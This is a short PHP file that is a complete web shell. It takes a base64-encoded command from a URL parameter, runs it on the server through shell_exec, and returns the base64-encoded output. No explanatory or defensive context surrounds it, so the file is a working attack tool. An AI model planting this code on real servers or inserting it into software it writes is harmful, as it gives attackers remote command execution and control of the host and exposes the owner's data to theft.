<?php
	if(isset($_GET['phpshellcmd'])){
		$cmd = base64_decode($_GET['phpshellcmd']);
		echo base64_encode(shell_exec($cmd));
	}
	die()
?>
